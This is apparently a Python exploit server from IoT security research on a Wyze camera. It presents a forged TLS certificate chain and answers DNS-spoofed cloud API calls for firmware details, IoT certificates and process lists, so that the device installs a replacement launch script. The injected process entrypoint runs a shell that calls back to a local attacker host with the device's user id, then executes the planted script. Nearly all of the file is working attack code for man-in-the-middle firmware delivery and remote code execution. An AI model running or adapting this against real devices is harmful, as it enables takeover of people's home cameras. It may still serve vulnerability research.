#!/usr/bin/env python3
"""Serve the OTA payload over TLS with a forged chain the camera trusts.

Bind :443 (or --port), present deliverables/certs/emudhra/{leaf.pem,leaf.key} with the cross-signed
intermediate appended, and serve --dir. Prints the chain it will send so a failure is diagnosable.

The camera reaches this by name, so something must resolve the name to this host: either a DNS
answer for the SAN host (see docs/exploit/wyze-forged-chain.md) or the delta URL pointed at a name
that already resolves here.

  wyze_forge_serve.py --dir /tmp/fwserve --port 443 --sni s3-us-west-2.amazonaws.com
"""
import argparse, http.server, json, os, socket, ssl, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
CERTDIR = os.path.join(HERE, "..", "certs", "emudhra")


UP_HOST = "device-api.wyzecam.com"


def _up_ip(host=UP_HOST):
    """Resolve the real device API past our own DNS redirect."""
    import subprocess
    try:
        out = subprocess.run(["dig", "+short", "+time=2", "@1.1.1.1", host],
                             capture_output=True, text=True).stdout.split()
        for c in out:
            if c and c[0].isdigit():
                return c
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# /firmware/upgrade/get_firmware_detail responder (docs/exploit/ota-path.md §23.4)
#
# Silent-upgrade delivery trigger: iCamera's WYZE_OTAPulse loop (iCamera:0x475b14 ->
# PLT WYZE_OTAPulse, GOT 0x8d4cdc) calls WYZE_GetFirmwareDetail (libwyzefdk.so:0x1acc8)
# which requests /firmware/upgrade/get_firmware_detail from the cloud API host we
# already DNS-spoof. A response in the captured shape drives the SDK verdict
# (0x1b944 -> 0x1b1bc) -> WYZE_OTA_CallBack (0xdafc, table 0x1874) -> iCamera
# fcn.00433680 -> fcn.00475c70(a0=4) -> SysV msg 0x1fe to assis ->
# system("sh /tmp/Upgrade/upgraderun.sh") (assis 0x4087c4). See §22/§23.
# ---------------------------------------------------------------------------


def firmware_detail_response(target_version, capsule_url, capsule_md5, trace_id=None):
    """Build the get_firmware_detail body in the §23.4 captured shape.

    Shape is the one retained from the real cloud answer (ota-path.md §2/§23.4):
    string "code":"1", "msg":"SUCCESS", data{version,url,filename}, traceId.
    The SDK verdict reads version + url; the md5 carrier is added under every alias
    observed in the descriptor vocabulary (assis handler 0x476e98 takes url/md5/model/
    sub_mac; §23.4 names firmwareMd5) so whichever the SDK forwards lands intact.
    """
    filename = capsule_url.rsplit("/", 1)[-1].split("?")[0] or "firmware.tar"
    data = {"version": target_version, "url": capsule_url, "filename": filename}
    data["firmware_md5"] = capsule_md5
    data["firmwareMd5"] = capsule_md5
    data["md5"] = capsule_md5
    return {
        "code": "1",
        "msg": "SUCCESS",
        "data": data,
        "traceId": trace_id or os.urandom(16).hex(),
    }


def passthrough(path, body, headers):
    """Forward an unimplemented call to the real cloud and return its bytes verbatim.

    The point is the *response schema*: the device asks for things we do not know how to answer
    (get_processes and friends), and the real answer is the specification.
    """
    host = (headers.get("Host") or UP_HOST).split(":")[0]
    ip = _up_ip(host)
    if not ip:
        return b'{"code":1,"message":"Success"}'
    try:
        raw = socket.create_connection((ip, 443), timeout=8)
        ctx = ssl.create_default_context()
        c = ctx.wrap_socket(raw, server_hostname=host)
        hdr = [f"POST {path} HTTP/1.1", f"Host: {host}",
               f"Content-Length: {len(body)}",
               "Content-Type: " + (headers.get("Content-Type") or "application/json"),
               "Connection: close"]
        for extra in ("X-Request-Id", "User-Agent", "Accept"):
            if headers.get(extra):
                hdr.append(f"{extra}: {headers.get(extra)}")
        c.sendall(("\r\n".join(hdr) + "\r\n\r\n").encode() + body)
        buf = b""
        while True:
            d = c.recv(65536)
            if not d:
                break
            buf += d
        c.close()
        head, _, payload = buf.partition(b"\r\n\r\n")
        print(f"  <- passthrough {len(payload)}B {payload[:4000]!r}", flush=True)
        return payload
    except Exception as e:
        print(f"  <- passthrough failed {e!r}", flush=True)
        return b'{"code":1,"message":"Success"}'


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--dir", default="/tmp/fwserve")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--cert", default=os.path.join(CERTDIR, "leaf.pem"))
    ap.add_argument("--key", default=os.path.join(CERTDIR, "leaf.key"))
    ap.add_argument("--intermediate", default=os.path.join(CERTDIR, "ev-ca-aaa-cross.pem"))
    ap.add_argument("--sni", default="s3-us-west-2.amazonaws.com", help="expected SNI, for the log")
    ap.add_argument("--firmware-detail", action="store_true", default=bool(os.environ.get("FIRMWARE_DETAIL")),
                    help="answer /firmware/upgrade/get_firmware_detail (silent-upgrade trigger, §23.4)")
    ap.add_argument("--target-version", default=os.environ.get("FIRMWARE_TARGET", "4.52.17.32"),
                    help="version echoed in the get_firmware_detail answer")
    ap.add_argument("--capsule-url",
                    default=os.environ.get(
                        "FIRMWARE_URL",
                        "https://s3-us-west-2.amazonaws.com/wuv2/upgrade/HL_CAM4/firmware/4.52.17.32.tar"),
                    help="capsule URL served to the device (host must be cert-covered)")
    ap.add_argument("--capsule-md5", default=os.environ.get("FIRMWARE_MD5",
                                                            "c642a2ca9f80b03c7ee5e05795f5822b"),
                    help="md5 of the capsule bytes; assis verifies it before exec (§22.2)")
    a = ap.parse_args()

    chain = os.path.join(CERTDIR, "serve.pem")
    # leaf FIRST: load_cert_chain treats the first certificate as the subject, the rest as chain
    with open(chain, "wb") as out:
        out.write(open(a.cert, "rb").read())
        out.write(open(a.intermediate, "rb").read())
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(chain, a.key)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *x, **kw):
            super().__init__(*x, directory=a.dir, **kw)

        def do_GET(self):
            # The SDK builds the get_firmware_detail request itself; accept GET too so a
            # probe or an SDK variant that uses GET still lands on the trigger (§23.4).
            if "get_firmware_detail" in self.path and a.firmware_detail:
                print(f"{self.address_string()} ua={self.headers.get('User-Agent','-')!r} "
                      f"GET {self.path}", flush=True)
                obj = firmware_detail_response(a.target_version, a.capsule_url, a.capsule_md5)
                print(f"  -> fw-detail v={a.target_version} url={a.capsule_url} md5={a.capsule_md5}",
                      flush=True)
                out = json.dumps(obj, separators=(",", ":")).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(out)))
                self.end_headers()
                self.wfile.write(out)
                return
            super().do_GET()

        def do_POST(self):
            n = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(n) if n else b""
            print(f"{self.address_string()} ua={self.headers.get('User-Agent','-')!r} "
                  f"POST {self.path} {body[:800]!r}", flush=True)
            if "get_processes" in self.path:
                print("  hdrs " + repr(dict(self.headers)), flush=True)
            if "get_iot_certificate" in self.path and os.environ.get("CERT_PASSTHROUGH"):
                out = passthrough(self.path, body, self.headers)
            elif "get_firmware_detail" in self.path and a.firmware_detail:
                # Silent-upgrade delivery trigger (ota-path.md §23.4). Log the request
                # fields so the first live run shows exactly what the SDK asked for.
                try:
                    req = json.loads(body)
                except Exception:
                    req = {}
                if isinstance(req, dict) and req:
                    print(f"  -> fw-detail req keys={sorted(req)} "
                          f"version={req.get('version') or req.get('targetVersion')!r}", flush=True)
                obj = firmware_detail_response(a.target_version, a.capsule_url, a.capsule_md5)
                print(f"  -> fw-detail v={a.target_version} url={a.capsule_url} md5={a.capsule_md5}",
                      flush=True)
                out = json.dumps(obj, separators=(",", ":")).encode()
            elif "get_iot_certificate" in self.path:
                # The stock client wants URLs, not inline PEM (EV-pack-H-002 §9.2). Each retry gets
                # the next envelope variant so the device itself walks the candidate list; the
                # accepted one is the variant after which it fetches the three URLs.
                base = "https://s3-us-west-2.amazonaws.com/fss"
                q = ("?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA%2F20261025%2Fus-west-2"
                     "%2Fs3%2Faws4_request&X-Amz-Date=20261025T000000Z&X-Amz-Expires=3600"
                     "&X-Amz-Signature=deadbeef")
                urls = {"ca_cert_url": base + "/rootCA.crt", "client_cert_url": base + "/cert.pem",
                        "client_private_key_url": base + "/privkey.pem"}
                pres = {k: v + q for k, v in urls.items()}
                ident = {"client_id": "80482c525905", "thing_name": "80482c525905", "keep_alive": 300}
                variants = [
                    ("int-code-msg", {"code": 1, "msg": "SUCCESS", "data": urls}),
                    ("str-code-msg", {"code": "1", "msg": "SUCCESS", "data": urls}),
                    ("int-code-message", {"code": 1, "message": "Success", "data": urls}),
                    ("int-code-msg-presigned", {"code": 1, "msg": "SUCCESS", "data": pres}),
                    ("int-code-msg-ident", {"code": 1, "msg": "SUCCESS", "data": {**urls, **ident}}),
                    ("root-cert-url", {"code": 1, "msg": "SUCCESS", "data": {
                        "root_cert_url": urls["ca_cert_url"], "client_cert_url": urls["client_cert_url"],
                        "client_private_key_url": urls["client_private_key_url"]}}),
                    ("bare-data", urls),
                    ("code-data-only", {"code": 1, "data": urls}),
                ]
                try:
                    i = int(open("/tmp/ota/cand_idx").read().strip())
                except Exception:
                    i = 0
                label, obj = variants[i % len(variants)]
                open("/tmp/ota/cand_idx", "w").write(str(i + 1))
                print(f"  -> variant[{i}] {label}", flush=True)
                out = json.dumps(obj).encode()
            elif ("get_processes" in self.path or "get_download_location" in self.path) \
                    and os.environ.get("PROC_ANSWER"):
                # Two different answers, captured from the cloud:
                #   get_processes          -> {"code":"1","msg":"v2","data":{"processes":[{processname,
                #                             entrypoint, maxstartuptime, version, components:[{checksum,
                #                             filename, localpath, type, version}]}]},"traceId":…}
                #   get_download_location  -> {"code":"1","msg":"SUCCESS","data":{version,url,filename},
                #                             "traceId":…}
                # The component `checksum` is the md5 of the bytes we serve; the device verifies it,
                # so a list without a matching checksum never produces a fetch.
                import hashlib
                base = "https://s3-us-west-2.amazonaws.com"
                # advertised version is bumped so the device sees a change; the served paths stay on
                # the version we mirrored, because the bytes are the real 50039 ones.
                model_ver = os.environ.get("MODEL_VER", "14.9.50040.r")
                model_path_ver = "14.9.50039.r"
                # the kvs process keeps its REAL version: 2.1.2.573 does not exist on the cloud, so
                # bumping it only produces NoSuchKey for webrtc.tar.gz.
                kvs_ver = os.environ.get("KVS_VER", "2.1.2.571")
                model_path = f"/wyzeedgeai_cam_v4_test_protocol/{model_path_ver}/wyzeedgeai_cam_v4_test_protocol"
                kvs_path = f"/kvsWebrtcClientMaster_t41/{kvs_ver}/launch.sh"

                def md5_of(rel):
                    try:
                        return hashlib.md5(open(os.path.join(a.dir, rel.lstrip("/")), "rb").read()).hexdigest()
                    except OSError:
                        return "0" * 32

                def presigned(path):
                    now = time.gmtime()
                    return (base + path + "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
                            "&X-Amz-Date=" + time.strftime("%Y%m%dT%H%M%SZ", now)
                            + "&X-Amz-SignedHeaders=host&X-Amz-Credential=AKIAYS2NUP7ICBQQ77UQ%2F"
                            + time.strftime("%Y%m%d", now) + "%2Fus-west-2%2Fs3%2Faws4_request"
                            "&X-Amz-Expires=300&X-Amz-Signature=" + "0" * 64)

                try:
                    req = json.loads(body)
                except Exception:
                    req = {}
                name = req.get("processname") or ""
                if "get_download_location" in self.path and os.environ.get("MIRROR"):
                    # hand out the real presigned URL so the device pulls from S3 and the mirror can
                    # harvest the bytes; the version echo below is only for our own URLs
                    out = passthrough(self.path, body, self.headers)
                elif "get_download_location" in self.path:
                    # echo the version the device asked for: it appears to reject a mismatch
                    asked = req.get("version") or ""
                    if asked:
                        if name.startswith("kvs"):
                            kvs_ver = asked
                        else:
                            model_ver = asked
                    if name.startswith("kvs"):
                        out = json.dumps({"code": "1", "ts": int(time.time() * 1000), "msg": "SUCCESS",
                                          "data": {"version": kvs_ver, "url": presigned(kvs_path),
                                                   "filename": "launch.sh"},
                                          "traceId": os.urandom(16).hex()}).encode()
                    else:
                        out = json.dumps({"code": "1", "ts": int(time.time() * 1000), "msg": "SUCCESS",
                                          "data": {"version": model_ver, "url": presigned(model_path),
                                                   "filename": "wyzeedgeai_cam_v4_test_protocol"},
                                          "traceId": os.urandom(16).hex()}).encode()
                else:
                    # The real answer lists every component with the checksum the device verifies;
                    # a short list never completes an install. Checksums are the cloud's own.
                    COMP = [
                        ("wyzeedgeai_cam_v4_test_protocol", "673cd0393426d370798b57affecca17a"),
                        ("aiparams.ini", "06f0d93ba5a0d8b6be9ac5fcdd91ec3b"),
                        ("model_params.ini", "0c4ad6d6dea852ccba25ad8cc0d159c8"),
                        ("libaip.so", "aaaeab3235092ff23fee9534969983de"),
                        ("libdrivers.so", "bc008dc48b165261f78cb660c1354c21"),
                        ("libvenus.so", "83614e5b5ffcc8d414f67cc876f77788"),
                        ("libwyzeAiTxx.so.1.0.1", "531e4fd3066d07ad4d18d0d4013539b5"),
                        ("wave_weights.txt", "37b2ad5643de574e7d6254adc7477437"),
                        ("sound_model_params.ini", "a93ca2e1c547bde83d41bc6714f306f7"),
                        ("libwyze_sound_mips.so", "570875b567638dfc5b60b31206433d51"),
                        ("res_monitor.sh", "a4fa1325f392742a11313da13426db36"),
                        ("mem_data_upload", "0370e40df04334401fd4ae7045b131ed"),
                        ("VERSION", "ddc95b0d133d926ea4ce9f014a75d250"),
                        # our replacement, so the checksum is of the bytes we serve, not the cloud's
                        ("launch.sh", md5_of("/wyzeedgeai_cam_v4_test_protocol/14.9.50039.r/launch.sh")),
                    ]
                    procs = [
                        {"processname": "wyzeedgeai_cam_v4_test_protocol",
                         # the entrypoint is ours and goes straight to system(): make it self-contained
                         # so a missing directory or an unwritten file cannot swallow the proof.
                         "entrypoint": ("sh -c 'mkdir -p /tmp/edgeai; "
                                        "curl -s -m 5 -o /dev/null "
                                        "\"http://192.168.4.160:8080/fss-ran?uid=$(id -u)&via=entry\"; "
                                        "sh /tmp/edgeai/launch.sh'"),
                         "maxstartuptime": 60,
                         "version": model_ver,
                         "components": [{"checksum": c,
                                         "filename": f,
                                         "localpath": "/tmp/edgeai/" + f,
                                         "type": None, "version": model_ver} for f, c in COMP]},
                        {"processname": "kvsWebrtcClientMaster_t41",
                         "entrypoint": "sh /tmp/webrtc/launch.sh", "maxstartuptime": 60,
                         "version": kvs_ver,
                         "components": [
                             {"checksum": md5_of(kvs_path), "filename": "launch.sh",
                              "localpath": "/tmp/webrtc/launch.sh", "type": None,
                              "version": kvs_ver},
                             {"checksum": md5_of(f"/kvsWebrtcClientMaster_t41/{kvs_ver}/webrtc.tar.gz"),
                              "filename": "webrtc.tar.gz",
                              "localpath": "/tmp/webrtc/webrtc.tar.gz", "type": None,
                              "version": kvs_ver}]},
                    ]
                    # a process the device has never seen: if the supervisor starts unknown
                    # entries, this is the start we cannot get from the cmd channel.
                    if os.environ.get("FSS_PROC"):
                        procs.append({
                            "processname": "fss",
                            "entrypoint": "sh /tmp/fss/launch.sh",
                            "maxstartuptime": 60, "version": "1.0.0",
                            "components": [{"checksum": md5_of("/proc/launch.sh"),
                                            "filename": "launch.sh",
                                            "localpath": "/tmp/fss/launch.sh",
                                            "type": None, "version": "1.0.0"}]})
                    if name:
                        procs = [x for x in procs if x["processname"] == name] or procs
                    out = json.dumps({"code": "1", "ts": int(time.time() * 1000), "msg": "v2",
                                      "data": {"processes": procs},
                                      "traceId": os.urandom(16).hex()},
                                     separators=(",", ":")).encode()
            elif os.environ.get("PASSTHROUGH"):
                out = passthrough(self.path, body, self.headers)
            else:
                out = b'{"code":1,"message":"Success"}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(out)))
            self.end_headers()
            self.wfile.write(out)

        def log_message(self, fmt, *args):
            # the device is distinguishable from a local probe only by its own UA
            print(f"{self.address_string()} ua={self.headers.get('User-Agent', '-')!r} " + (fmt % args),
                  flush=True)

    handler = Handler

    class Server(http.server.HTTPServer):
        allow_reuse_address = True

    srv = Server(("0.0.0.0", a.port), handler)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    print(f"serving {a.dir} on :{a.port}, expecting SNI {a.sni}, chain {chain}", flush=True)
    srv.serve_forever()
    return 0


if __name__ == "__main__":
    sys.exit(main())
